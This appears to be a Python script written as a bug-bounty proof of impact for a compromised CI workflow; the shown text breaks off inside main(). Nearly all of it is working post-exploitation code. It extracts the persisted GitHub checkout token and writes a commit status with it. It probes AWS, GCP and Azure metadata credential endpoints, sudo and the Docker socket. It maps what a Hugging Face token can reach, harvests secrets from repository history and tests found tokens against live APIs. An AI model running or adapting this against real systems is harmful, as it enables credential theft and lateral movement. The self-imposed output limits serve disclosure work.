"""Bounded live impact and pivot audit for the FairChem Meta LHE report.

This module is intentionally self-contained and uses only the Python standard
library.  It never prints a credential, identity, repository name, path,
response body, model byte, URL, hash, or cloud metadata value.  Public output
is limited to fixed-key booleans, status classes, and aggregate counts.

The only production mutation is a uniquely named commit status on the closed
canary commit itself.  That proves the checked-out fork code can use the
workflow's persisted GitHub credential.  No branch, release, package, model,
artifact, cache, cloud resource, or third-party job is modified.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import pickletools
import re
import socket
import struct
import subprocess
import tempfile
from collections import Counter
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlencode
from urllib.request import ProxyHandler, Request, build_opener, urlopen


HF_ENDPOINT = "https://huggingface.co"
GH_ENDPOINT = "https://api.github.com"
MARKER = "META_LHE_FAIRCHEM_PIVOT_AUDIT"
USER_AGENT = "meta-lhe-fairchem-pivot-audit/1.0"
TIMEOUT = 30
MAX_GIT_BLOB = 8 * 1024 * 1024
MAX_GIT_SCAN_PER_REPO = 64 * 1024 * 1024
MAX_REMOTE_SCAN_TOTAL = 128 * 1024 * 1024
MAX_REMOTE_FILE_SCAN = 4 * 1024 * 1024
MAX_BINARY_PREFIX = 8 * 1024 * 1024
MAX_BINARY_SUFFIX = 1024 * 1024


def emit(name: str, value: object) -> None:
    if isinstance(value, bool):
        rendered = str(value).lower()
    else:
        rendered = str(value)
    print(f"{MARKER}_{name}={rendered}", flush=True)


def web_request(
    url: str,
    token: str | None = None,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: int = TIMEOUT,
) -> Any:
    request_headers = {"User-Agent": USER_AGENT}
    if token:
        request_headers["Authorization"] = f"Bearer {token}"
    if headers:
        request_headers.update(headers)
    return urlopen(
        Request(url, data=data, method=method, headers=request_headers),
        timeout=timeout,
    )


def json_request(
    url: str,
    token: str | None = None,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    payload: object | None = None,
) -> tuple[object | None, int]:
    body = None
    merged_headers = dict(headers or {})
    if payload is not None:
        body = json.dumps(payload, separators=(",", ":")).encode()
        merged_headers["Content-Type"] = "application/json"
    try:
        with web_request(
            url,
            token,
            method=method,
            headers=merged_headers,
            data=body,
        ) as response:
            return json.load(response), int(response.status)
    except HTTPError as error:
        error.close()
        return None, int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return None, 0


def status_request(
    url: str,
    token: str | None = None,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    payload: object | None = None,
) -> int:
    body = None
    merged_headers = dict(headers or {})
    if payload is not None:
        body = json.dumps(payload, separators=(",", ":")).encode()
        merged_headers["Content-Type"] = "application/json"
    try:
        with web_request(
            url,
            token,
            method=method,
            headers=merged_headers,
            data=body,
        ) as response:
            # Retain the authorization result only.  In particular, do not
            # consume audit logs, settings, membership data, or minted tokens.
            return int(response.status)
    except HTTPError as error:
        error.close()
        return int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return 0


def range_bytes(
    url: str,
    token: str,
    start: int,
    end: int,
) -> tuple[bytes, int]:
    if start < 0 or end < start:
        return b"", 0
    length = end - start + 1
    try:
        with web_request(
            url,
            token,
            headers={"Range": f"bytes={start}-{end}"},
        ) as response:
            # Even if an intermediary ignores Range and replies 200, consume no
            # more than the requested window.
            return response.read(length), int(response.status)
    except HTTPError as error:
        error.close()
        return b"", int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return b"", 0


HIGH_SECRET_PATTERNS: tuple[tuple[str, re.Pattern[bytes]], ...] = (
    ("aws_access_key", re.compile(rb"(?<![A-Z0-9])(?:AKIA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])")),
    ("github_token", re.compile(rb"(?<![A-Za-z0-9_])(?:gh[pousr]_[A-Za-z0-9]{20,255}|github_pat_[A-Za-z0-9_]{20,255})")),
    ("hf_token", re.compile(rb"(?<![A-Za-z0-9_])hf_[A-Za-z0-9]{20,255}")),
    ("slack_token", re.compile(rb"(?<![A-Za-z0-9-])xox[baprs]-[A-Za-z0-9-]{20,255}")),
    ("google_api_key", re.compile(rb"(?<![A-Za-z0-9_-])AIza[A-Za-z0-9_-]{35}(?![A-Za-z0-9_-])")),
    ("private_key", re.compile(rb"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----")),
    ("url_credential", re.compile(rb"https?://[^\s/:@]{1,80}:[^\s/@]{8,200}@")),
)

GENERIC_SECRET = re.compile(
    rb"(?i)(?:api[_-]?key|access[_-]?token|client[_-]?secret|password|passwd|secret)"
    rb"\s*[=:]\s*[\"']?([A-Za-z0-9_./+=-]{12,255})"
)
AWS_SECRET = re.compile(
    rb"(?i)(?:aws_secret_access_key|secret_access_key)\s*[=:]\s*[\"']?([A-Za-z0-9/+=]{40})"
)
INTERNAL_MARKERS = re.compile(
    rb"(?i)(?:https?://[^\s\"']*(?:\.internal|\.corp|\.tfbnw\.net)|"
    rb"(?:s3|gs|az|manifold)://|/checkpoint/|/private/home/|slurm|wandb\.ai/)"
)
EXECUTION_MARKERS = re.compile(
    rb"(?i)(?:trust_remote_code\s*=\s*true|torch\.load\s*\(|pickle\.loads?\s*\(|"
    rb"os\.system\s*\(|subprocess\.(?:run|popen|call)\s*\(|\beval\s*\(|\bexec\s*\()"
)
PLACEHOLDERS = {
    b"your_token_here",
    b"mytoken",
    b"my_token",
    b"changeme",
    b"placeholder",
    b"example_token",
    b"xxxxxxxxxxxx",
}


class ScanState:
    def __init__(self) -> None:
        self.counts: Counter[str] = Counter()
        self.candidates: dict[str, set[bytes]] = {
            name: set() for name, _ in HIGH_SECRET_PATTERNS
        }
        self.aws_secrets: set[bytes] = set()

    def scan(self, data: bytes, *, historical_only: bool = False) -> None:
        if not data:
            return
        self.counts["payloads"] += 1
        self.counts["bytes"] += len(data)
        high_in_payload = False
        for kind, pattern in HIGH_SECRET_PATTERNS:
            matches = pattern.findall(data)
            if not matches:
                continue
            high_in_payload = True
            self.counts[f"high_{kind}"] += len(matches)
            for match in matches[:8]:
                if isinstance(match, bytes) and len(self.candidates[kind]) < 32:
                    self.candidates[kind].add(match)
        if high_in_payload:
            self.counts["high_candidate_payloads"] += 1
            if historical_only:
                self.counts["historical_only_high_candidate_payloads"] += 1

        generic = 0
        for match in GENERIC_SECRET.findall(data):
            normalized = match.strip(b"\"'").lower()
            if normalized in PLACEHOLDERS or normalized.startswith((b"${", b"<")):
                continue
            if len(set(normalized)) <= 3:
                continue
            generic += 1
        self.counts["generic_secret_assignment_candidates"] += generic

        aws_secret_matches = AWS_SECRET.findall(data)
        self.counts["aws_secret_candidates"] += len(aws_secret_matches)
        for match in aws_secret_matches[:8]:
            if len(self.aws_secrets) < 32:
                self.aws_secrets.add(match)

        self.counts["internal_reference_matches"] += len(INTERNAL_MARKERS.findall(data))
        self.counts["execution_primitive_matches"] += len(EXECUTION_MARKERS.findall(data))


def run_git(args: list[str], cwd: str, *, env: dict[str, str] | None = None, timeout: int = 180) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
        timeout=timeout,
    )


def scan_git_mirror(repo_name: str, hf_token: str, state: ScanState) -> Counter[str]:
    result: Counter[str] = Counter()
    with tempfile.TemporaryDirectory(prefix="lhe-hf-mirror-") as temp_root:
        mirror = str(Path(temp_root) / "repo.git")
        env = dict(os.environ)
        env.update(
            {
                "GIT_TERMINAL_PROMPT": "0",
                "GIT_LFS_SKIP_SMUDGE": "1",
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "http.https://huggingface.co/.extraheader",
                "GIT_CONFIG_VALUE_0": f"AUTHORIZATION: Bearer {hf_token}",
            }
        )
        clone = subprocess.run(
            [
                "git",
                "clone",
                "--mirror",
                "--quiet",
                f"https://huggingface.co/{repo_name}",
                mirror,
            ],
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
            timeout=240,
        )
        if clone.returncode != 0:
            result["clone_failures"] += 1
            return result
        result["clone_successes"] += 1

        refs = run_git(["for-each-ref", "--format=%(refname)"], mirror)
        result["refs"] += len([line for line in refs.stdout.splitlines() if line])
        commits = run_git(["rev-list", "--all", "--count"], mirror)
        try:
            result["commits"] += int(commits.stdout.strip() or b"0")
        except ValueError:
            result["metadata_failures"] += 1

        current_blobs: set[bytes] = set()
        current = run_git(["ls-tree", "-r", "refs/heads/main"], mirror)
        if current.returncode == 0:
            for line in current.stdout.splitlines():
                match = re.match(rb"\d+ blob ([0-9a-f]{40,64})\t", line)
                if match:
                    current_blobs.add(match.group(1))

        objects = run_git(
            ["cat-file", "--batch-all-objects", "--batch-check=%(objectname) %(objecttype) %(objectsize)"],
            mirror,
        )
        blobs: list[tuple[bytes, int]] = []
        for line in objects.stdout.splitlines():
            parts = line.split()
            if len(parts) != 3 or parts[1] != b"blob":
                continue
            try:
                size = int(parts[2])
            except ValueError:
                result["metadata_failures"] += 1
                continue
            blobs.append((parts[0], size))
        result["unique_blobs"] += len(blobs)

        scanned = 0
        process = subprocess.Popen(
            ["git", "cat-file", "--batch"],
            cwd=mirror,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
        )
        assert process.stdin is not None and process.stdout is not None
        try:
            for object_id, size in blobs:
                if size > MAX_GIT_BLOB or scanned + size > MAX_GIT_SCAN_PER_REPO:
                    result["unscanned_blobs"] += 1
                    result["unscanned_blob_bytes"] += size
                    continue
                process.stdin.write(object_id + b"\n")
                process.stdin.flush()
                header = process.stdout.readline().split()
                if len(header) < 3 or header[1] != b"blob":
                    result["blob_read_failures"] += 1
                    continue
                try:
                    actual_size = int(header[2])
                except ValueError:
                    result["blob_read_failures"] += 1
                    continue
                data = process.stdout.read(actual_size)
                process.stdout.read(1)
                if len(data) != actual_size:
                    result["blob_read_failures"] += 1
                    continue
                scanned += len(data)
                result["scanned_blobs"] += 1
                result["scanned_blob_bytes"] += len(data)
                if data.startswith(b"version https://git-lfs.github.com/spec/"):
                    result["lfs_pointers"] += 1
                state.scan(data, historical_only=object_id not in current_blobs)
        finally:
            try:
                process.stdin.close()
            except OSError:
                pass
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
    return result


def inspect_pickle_metadata(data: bytes, counters: Counter[str]) -> None:
    # pickletools disassembles opcodes and never executes them.
    try:
        for opcode, argument, _ in pickletools.genops(data):
            counters["pickle_opcodes"] += 1
            if opcode.name in {"GLOBAL", "STACK_GLOBAL", "REDUCE", "BUILD", "OBJ", "INST"}:
                counters["pickle_execution_capable_opcodes"] += 1
            if isinstance(argument, str) and INTERNAL_MARKERS.search(argument.encode(errors="ignore")):
                counters["pickle_internal_reference_matches"] += 1
    except (ValueError, UnicodeDecodeError, struct.error):
        counters["pickle_partial_or_invalid"] += 1


def scan_remote_repository(
    repo_name: str,
    hf_token: str,
    state: ScanState,
    remaining_budget: list[int],
) -> Counter[str]:
    counters: Counter[str] = Counter()
    encoded = quote(repo_name, safe="/")
    info, status = json_request(f"{HF_ENDPOINT}/api/models/{encoded}?blobs=true", hf_token)
    if status != 200 or not isinstance(info, dict):
        counters["api_failures"] += 1
        return counters
    siblings = info.get("siblings")
    if not isinstance(siblings, list):
        counters["api_failures"] += 1
        return counters
    counters["files"] += len(siblings)
    for sibling in siblings:
        if not isinstance(sibling, dict):
            continue
        path = sibling.get("rfilename")
        size = sibling.get("size")
        if not isinstance(path, str) or not isinstance(size, int) or size < 0:
            continue
        counters["logical_bytes"] += size
        lower = path.lower()
        if isinstance(sibling.get("lfs"), dict):
            counters["large_storage_files"] += 1
            counters["large_storage_logical_bytes"] += size
        if lower.endswith((".py", ".sh", ".bash", ".js", ".ts", ".so", ".dll", ".dylib")):
            counters["executable_or_code_files"] += 1
        if lower.endswith((".pt", ".pth", ".ckpt", ".bin", ".pkl", ".pickle")):
            counters["pickle_or_checkpoint_files"] += 1
        if lower.endswith((".safetensors", ".gguf", ".onnx")):
            counters["data_only_model_format_files"] += 1
        if any(part in lower for part in (".github/workflows/", "dockerfile", "app.py", "handler.py", "modeling_", "configuration_")):
            counters["autoload_or_ci_path_files"] += 1

        if remaining_budget[0] <= 0:
            counters["budget_skipped_files"] += 1
            continue
        file_url = f"{HF_ENDPOINT}/{encoded}/resolve/main/{quote(path, safe='/')}"
        chunks: list[bytes] = []
        if size <= MAX_REMOTE_FILE_SCAN:
            wanted = min(size, remaining_budget[0])
            if wanted:
                data, read_status = range_bytes(file_url, hf_token, 0, wanted - 1)
                if read_status in (200, 206) and data:
                    chunks.append(data)
                    counters["fully_scanned_files"] += int(len(data) == size)
                    counters["remote_bytes_scanned"] += len(data)
                    remaining_budget[0] -= len(data)
                else:
                    counters["range_failures"] += 1
        elif lower.endswith(".safetensors"):
            prefix, read_status = range_bytes(file_url, hf_token, 0, 7)
            if read_status in (200, 206) and len(prefix) == 8:
                header_size = struct.unpack("<Q", prefix)[0]
                if 0 < header_size <= MAX_BINARY_PREFIX and header_size + 8 <= size:
                    wanted = min(header_size, remaining_budget[0])
                    header, header_status = range_bytes(file_url, hf_token, 8, 7 + wanted)
                    if header_status in (200, 206) and header:
                        chunks.append(header)
                        counters["safetensors_headers_scanned"] += 1
                        counters["remote_bytes_scanned"] += len(header) + 8
                        remaining_budget[0] -= len(header)
                    else:
                        counters["range_failures"] += 1
                else:
                    counters["invalid_or_oversized_safetensors_headers"] += 1
            else:
                counters["range_failures"] += 1
        elif lower.endswith((".pt", ".pth", ".ckpt", ".bin", ".pkl", ".pickle", ".zip", ".tar", ".gguf", ".onnx")):
            prefix_size = min(size, MAX_BINARY_PREFIX, remaining_budget[0])
            if prefix_size:
                prefix, prefix_status = range_bytes(file_url, hf_token, 0, prefix_size - 1)
                if prefix_status in (200, 206) and prefix:
                    chunks.append(prefix)
                    counters["binary_prefixes_scanned"] += 1
                    counters["remote_bytes_scanned"] += len(prefix)
                    remaining_budget[0] -= len(prefix)
                    if lower.endswith((".pt", ".pth", ".ckpt", ".bin", ".pkl", ".pickle")):
                        inspect_pickle_metadata(prefix, counters)
                else:
                    counters["range_failures"] += 1
            suffix_size = min(size, MAX_BINARY_SUFFIX, remaining_budget[0])
            if suffix_size and size > prefix_size:
                suffix, suffix_status = range_bytes(
                    file_url, hf_token, size - suffix_size, size - 1
                )
                if suffix_status in (200, 206) and suffix:
                    chunks.append(suffix)
                    counters["binary_suffixes_scanned"] += 1
                    counters["remote_bytes_scanned"] += len(suffix)
                    remaining_budget[0] -= len(suffix)
                else:
                    counters["range_failures"] += 1
        else:
            counters["large_uninspected_files"] += 1
            counters["large_uninspected_bytes"] += size

        for chunk in chunks:
            state.scan(chunk)
            if b"data.pkl" in chunk:
                counters["torch_zip_data_pickle_markers"] += 1
    return counters


def validate_discovered_candidates(state: ScanState) -> Counter[str]:
    results: Counter[str] = Counter()
    for candidate in state.candidates["hf_token"]:
        status = status_request(f"{HF_ENDPOINT}/api/whoami-v2", candidate.decode("ascii", "ignore"))
        results["hf_candidates_checked"] += 1
        results["hf_candidates_active"] += int(status == 200)
    for candidate in state.candidates["github_token"]:
        status = status_request(
            f"{GH_ENDPOINT}/user",
            candidate.decode("ascii", "ignore"),
            headers={"Accept": "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28"},
        )
        results["github_candidates_checked"] += 1
        results["github_candidates_active"] += int(status == 200)
    results["aws_access_key_candidates"] = len(state.candidates["aws_access_key"])
    results["aws_secret_candidates"] = len(state.aws_secrets)
    results["aws_pair_candidates"] = min(
        results["aws_access_key_candidates"], results["aws_secret_candidates"]
    )
    return results


def extract_checkout_github_token() -> str | None:
    # checkout v6+ stores the secret under RUNNER_TEMP and installs an
    # includeIf from the repository config.  `--includes` resolves that file;
    # capture it in memory only and never print either its origin or value.
    commands = (
        ["git", "config", "--includes", "--get-all", "http.https://github.com/.extraheader"],
        ["git", "config", "--includes", "--get-regexp", r"^http\..*\.extraheader$"],
    )
    for command in commands:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            check=False,
            timeout=10,
        )
        for line in proc.stdout.splitlines():
            match = re.search(
                rb"(?i)authorization:\s*basic\s+([A-Za-z0-9+/=]+)", line
            )
            if not match:
                continue
            try:
                decoded = base64.b64decode(match.group(1), validate=True).decode()
            except (ValueError, UnicodeDecodeError):
                continue
            if ":" in decoded:
                token = decoded.split(":", 1)[1]
                if token:
                    return token
    return None


def github_status_proof(github_token: str | None) -> Counter[str]:
    results: Counter[str] = Counter()
    results["checkout_credential_present"] = int(bool(github_token))
    if not github_token:
        return results
    repository = os.environ.get("GITHUB_REPOSITORY", "")
    if not re.fullmatch(r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+", repository):
        results["input_failures"] += 1
        return results
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        check=False,
        timeout=10,
    ).stdout.decode("ascii", "ignore").strip()
    if not re.fullmatch(r"[0-9a-f]{40}", head):
        results["input_failures"] += 1
        return results
    run_url = "/".join(
        (
            os.environ.get("GITHUB_SERVER_URL", "https://github.com").rstrip("/"),
            repository,
            "actions/runs",
            os.environ.get("GITHUB_RUN_ID", "0"),
        )
    )
    payload = {
        "state": "success",
        "context": "meta-lhe/fairchem-bounded-status-write",
        "description": "Bounded LHE status-write proof on closed canary commit",
        "target_url": run_url,
    }
    response, status = json_request(
        f"{GH_ENDPOINT}/repos/{repository}/statuses/{head}",
        github_token,
        method="POST",
        headers={
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
        },
        payload=payload,
    )
    results["status_write_http_status"] = status
    results["status_write_succeeded"] = int(
        status == 201
        and isinstance(response, dict)
        and response.get("context") == payload["context"]
        and response.get("state") == "success"
    )
    results["status_response_body_emitted"] = 0
    return results


def no_proxy_request(
    url: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
) -> tuple[bytes, int]:
    opener = build_opener(ProxyHandler({}))
    request = Request(url, data=data, method=method, headers=headers or {})
    try:
        with opener.open(request, timeout=2) as response:
            return response.read(8192), int(response.status)
    except HTTPError as error:
        error.close()
        return b"", int(error.code)
    except (URLError, TimeoutError, OSError, socket.timeout):
        return b"", 0


def runner_boundary_probe() -> Counter[str]:
    results: Counter[str] = Counter()
    for variable in (
        "ACTIONS_ID_TOKEN_REQUEST_URL",
        "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        "ACTIONS_RUNTIME_TOKEN",
        "ACTIONS_RESULTS_URL",
        "ACTIONS_CACHE_URL",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "AZURE_CLIENT_ID",
        "AZURE_TENANT_ID",
    ):
        results[f"env_{variable.lower()}_present"] = int(bool(os.environ.get(variable)))

    try:
        sudo = subprocess.run(
            ["sudo", "-n", "true"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
            timeout=10,
        )
        results["passwordless_sudo"] = int(sudo.returncode == 0)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        results["passwordless_sudo"] = 0
    docker_socket = Path("/var/run/docker.sock")
    results["docker_socket_present"] = int(docker_socket.exists())
    results["docker_socket_writable"] = int(os.access(docker_socket, os.W_OK))

    aws_token, aws_token_status = no_proxy_request(
        "http://169.254.169.254/latest/api/token",
        method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
        data=b"",
    )
    results["aws_imdsv2_token_http_status"] = aws_token_status
    if aws_token_status == 200 and aws_token:
        roles, roles_status = no_proxy_request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={"X-aws-ec2-metadata-token": aws_token.decode("ascii", "ignore")},
        )
        results["aws_iam_role_list_http_status"] = roles_status
        results["aws_iam_role_present"] = int(
            roles_status == 200 and bool(roles.strip())
        )
    else:
        results["aws_iam_role_list_http_status"] = 0
        results["aws_iam_role_present"] = 0

    gcp_accounts, gcp_status = no_proxy_request(
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        headers={"Metadata-Flavor": "Google"},
    )
    results["gcp_service_account_list_http_status"] = gcp_status
    results["gcp_service_account_present"] = int(
        gcp_status == 200 and bool(gcp_accounts.strip())
    )

    _, azure_instance_status = no_proxy_request(
        "http://169.254.169.254/metadata/instance?api-version=2025-04-07",
        headers={"Metadata": "true"},
    )
    results["azure_instance_metadata_http_status"] = azure_instance_status
    _, azure_identity_status = no_proxy_request(
        "http://169.254.169.254/metadata/identity/oauth2/token?"
        + urlencode(
            {
                "api-version": "2019-08-01",
                "resource": "https://management.azure.com/",
            }
        ),
        headers={"Metadata": "true"},
    )
    results["azure_managed_identity_http_status"] = azure_identity_status
    results["cloud_credential_body_emitted"] = 0
    return results


def role_counts(orgs: list[object]) -> Counter[str]:
    counts: Counter[str] = Counter()
    for org in orgs:
        if not isinstance(org, dict):
            continue
        role = org.get("roleInOrg")
        if isinstance(role, str):
            counts[f"org_role_{role}"] += 1
        else:
            counts["org_role_not_reported"] += 1
        groups = org.get("resourceGroups")
        if isinstance(groups, list):
            counts["reported_resource_group_assignments"] += len(groups)
            for group in groups:
                if isinstance(group, dict) and isinstance(group.get("role"), str):
                    counts[f"resource_group_role_{group['role']}"] += 1
        restrictions = org.get("securityRestrictions")
        if isinstance(restrictions, list):
            counts["security_restrictions"] += len(restrictions)
    return counts


def authorization_matrix(
    whoami: dict[str, object],
    scoped_models: list[str],
    hf_token: str,
) -> Counter[str]:
    results: Counter[str] = Counter()
    owner = whoami.get("name") if isinstance(whoami.get("name"), str) else None
    orgs = whoami.get("orgs") if isinstance(whoami.get("orgs"), list) else []
    org_names = [
        org["name"]
        for org in orgs
        if isinstance(org, dict) and isinstance(org.get("name"), str)
    ]
    namespaces = list(dict.fromkeys([name for name in [owner, *org_names] if name]))

    for namespace in namespaces:
        encoded = quote(namespace, safe="")
        for permission in ("read", "write"):
            status = status_request(
                f"{HF_ENDPOINT}/api/jobs/{encoded}/auth-check/{permission}",
                hf_token,
                method="POST",
            )
            results[f"jobs_{permission}_auth_success"] += int(status in (200, 204))
        for permission in ("read", "write", "infer"):
            status = status_request(
                f"{HF_ENDPOINT}/api/inference-endpoints/{encoded}/auth-check/{permission}?incur_cost=true",
                hf_token,
                method="POST",
            )
            results[f"inference_endpoint_{permission}_auth_success"] += int(
                status in (200, 204)
            )

    org_endpoint_templates = (
        "/api/organizations/{}/members?limit=1",
        "/api/organizations/{}/resource-groups",
        "/api/organizations/{}/service-accounts",
        "/api/organizations/{}/settings/tokens",
        "/api/organizations/{}/billing/credits",
        "/api/organizations/{}/audit-log/export",
        "/api/organizations/{}/settings/network-security",
        "/api/organizations/{}/settings/repositories",
        "/api/organizations/{}/settings/sso/credentials",
    )
    for org_name in org_names:
        encoded = quote(org_name, safe="")
        for template in org_endpoint_templates:
            url = HF_ENDPOINT + template.format(encoded)
            auth_status = status_request(url, hf_token)
            anon_status = status_request(url, None)
            results["org_sensitive_endpoint_tests"] += 1
            results["org_sensitive_auth_200"] += int(auth_status == 200)
            results["org_sensitive_anon_200"] += int(anon_status == 200)
            results["org_sensitive_auth_only_200"] += int(
                auth_status == 200 and anon_status != 200
            )

    user_endpoints = (
        "/api/settings/webhooks",
        "/api/settings/billing/usage/jobs",
        "/api/settings/billing/usage-by-inference-session",
        "/api/settings/inference-providers/usage-limits",
    )
    for endpoint in user_endpoints:
        auth_status = status_request(HF_ENDPOINT + endpoint, hf_token)
        anon_status = status_request(HF_ENDPOINT + endpoint, None)
        results["user_sensitive_endpoint_tests"] += 1
        results["user_sensitive_auth_only_200"] += int(
            auth_status == 200 and anon_status != 200
        )

    for repo_name in scoped_models:
        encoded = quote(repo_name, safe="/")
        repo_endpoints = (
            f"/api/models/{encoded}/settings/trusted-publishers",
            f"/api/models/{encoded}/resource-group",
            f"/api/models/{encoded}/settings",
            f"/api/models/{encoded}/discussions",
        )
        for endpoint in repo_endpoints:
            auth_status = status_request(HF_ENDPOINT + endpoint, hf_token)
            anon_status = status_request(HF_ENDPOINT + endpoint, None)
            results["repo_metadata_endpoint_tests"] += 1
            results["repo_metadata_auth_only_200"] += int(
                auth_status == 200 and anon_status != 200
            )
            results["repo_metadata_auth_200"] += int(auth_status == 200)
    return results


def registry_claim_matrix(scoped_models: list[str], hf_token: str) -> Counter[str]:
    results: Counter[str] = Counter()
    for repo_name in scoped_models:
        query = urlencode(
            {
                "service": "cr.hf.co",
                "scope": f"repository:{repo_name.lower()}:pull,push",
            }
        )
        response, status = json_request(
            f"{HF_ENDPOINT}/api/registry/token?{query}", hf_token
        )
        results["registry_token_tests"] += 1
        results["registry_token_http_200"] += int(status == 200)
        if status != 200 or not isinstance(response, dict):
            continue
        encoded_token = response.get("token")
        if not isinstance(encoded_token, str):
            continue
        parts = encoded_token.split(".")
        if len(parts) != 3:
            continue
        try:
            raw = parts[1] + "=" * (-len(parts[1]) % 4)
            claims = json.loads(base64.urlsafe_b64decode(raw))
        except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
            results["registry_claim_parse_failures"] += 1
            continue
        access = claims.get("access") if isinstance(claims, dict) else None
        if not isinstance(access, list):
            continue
        actions: set[str] = set()
        for entry in access:
            if isinstance(entry, dict) and isinstance(entry.get("actions"), list):
                actions.update(
                    action for action in entry["actions"] if isinstance(action, str)
                )
        results["registry_pull_claims"] += int("pull" in actions)
        results["registry_push_claims"] += int("push" in actions)
    return results


def checkout_reference_counts(scoped_models: list[str]) -> Counter[str]:
    results: Counter[str] = Counter()
    root = Path.cwd()
    repo_needles = [name.encode() for name in scoped_models]
    for path in root.rglob("*"):
        if not path.is_file() or ".git" in path.parts:
            continue
        try:
            if path.stat().st_size > 2 * 1024 * 1024:
                continue
            data = path.read_bytes()
        except OSError:
            continue
        if b"\x00" in data:
            continue
        matched = sum(needle in data for needle in repo_needles)
        if not matched:
            continue
        results["files_referencing_scoped_repositories"] += 1
        results["scoped_repository_reference_hits"] += matched
        if re.search(rb"(?i)(?:hf_hub_download|snapshot_download|from_pretrained|pretrained_checkpoint|resolve/main)", data):
            results["download_or_load_reference_files"] += 1
    return results


def merge_counters(target: Counter[str], source: Counter[str]) -> None:
    for key, value in source.items():
        target[key] += value


def main() -> int:
    emit("STARTED", True)
    emit("TOKEN_VALUES_EMITTED", False)
    emit("IDENTITY_NAMES_EMITTED", False)
    emit("REPOSITORY_NAMES_EMITTED", False)
    emit("PATHS_OR_CONTENT_EMITTED", False)
    emit("EXISTING_MODEL_OR_ARTIFACT_MUTATED", False)

    hf_token = os.environ.get("HF_TOKEN", "")
    emit("HF_TOKEN_PRESENT", bool(hf_token))
    if not hf_token:
        emit("COMPLETE", False)
        return 78
    whoami_raw, whoami_status = json_request(f"{HF_ENDPOINT}/api/whoami-v2", hf_token)
    authenticated = whoami_status == 200 and isinstance(whoami_raw, dict)
    emit("HF_WHOAMI_HTTP_STATUS", whoami_status)
    emit("HF_AUTHENTICATED", authenticated)
    if not authenticated:
        emit("COMPLETE", False)
        return 78
    assert isinstance(whoami_raw, dict)

    auth = whoami_raw.get("auth") if isinstance(whoami_raw.get("auth"), dict) else {}
    access = auth.get("accessToken") if isinstance(auth.get("accessToken"), dict) else {}
    fine = access.get("fineGrained") if isinstance(access.get("fineGrained"), dict) else {}
    scoped = fine.get("scoped") if isinstance(fine.get("scoped"), list) else []
    scoped_models: list[str] = []
    scoped_permissions: Counter[str] = Counter()
    for item in scoped:
        if not isinstance(item, dict):
            continue
        entity = item.get("entity")
        permissions = item.get("permissions")
        if isinstance(permissions, list):
            for permission in permissions:
                if isinstance(permission, str):
                    scoped_permissions[permission] += 1
        if (
            isinstance(entity, dict)
            and entity.get("type") == "model"
            and isinstance(entity.get("name"), str)
        ):
            scoped_models.append(entity["name"])
    scoped_models = list(dict.fromkeys(scoped_models))
    emit("SCOPED_MODEL_COUNT", len(scoped_models))
    emit("SCOPED_PERMISSION_CLASS_COUNT", len(scoped_permissions))
    emit("SCOPED_READ_PERMISSION_COUNT", sum(v for k, v in scoped_permissions.items() if k.endswith(".read")))
    emit("SCOPED_WRITE_PERMISSION_COUNT", sum(v for k, v in scoped_permissions.items() if k.endswith(".write")))

    orgs = whoami_raw.get("orgs") if isinstance(whoami_raw.get("orgs"), list) else []
    emit("ORG_COUNT", len(orgs))
    for key, value in sorted(role_counts(orgs).items()):
        emit(key.upper(), value)

    github_results = github_status_proof(extract_checkout_github_token())
    for key, value in sorted(github_results.items()):
        emit(f"GITHUB_{key.upper()}", value)

    runner_results = runner_boundary_probe()
    for key, value in sorted(runner_results.items()):
        emit(f"RUNNER_{key.upper()}", value)

    auth_results = authorization_matrix(whoami_raw, scoped_models, hf_token)
    for key, value in sorted(auth_results.items()):
        emit(f"HF_AUTHZ_{key.upper()}", value)

    registry_results = registry_claim_matrix(scoped_models, hf_token)
    for key, value in sorted(registry_results.items()):
        emit(f"HF_{key.upper()}", value)

    reference_results = checkout_reference_counts(scoped_models)
    for key, value in sorted(reference_results.items()):
        emit(f"CONSUMER_{key.upper()}", value)

    state = ScanState()
    git_totals: Counter[str] = Counter()
    remote_totals: Counter[str] = Counter()
    remaining_budget = [MAX_REMOTE_SCAN_TOTAL]
    for repo_name in scoped_models:
        merge_counters(git_totals, scan_git_mirror(repo_name, hf_token, state))
        merge_counters(
            remote_totals,
            scan_remote_repository(repo_name, hf_token, state, remaining_budget),
        )
    for key, value in sorted(git_totals.items()):
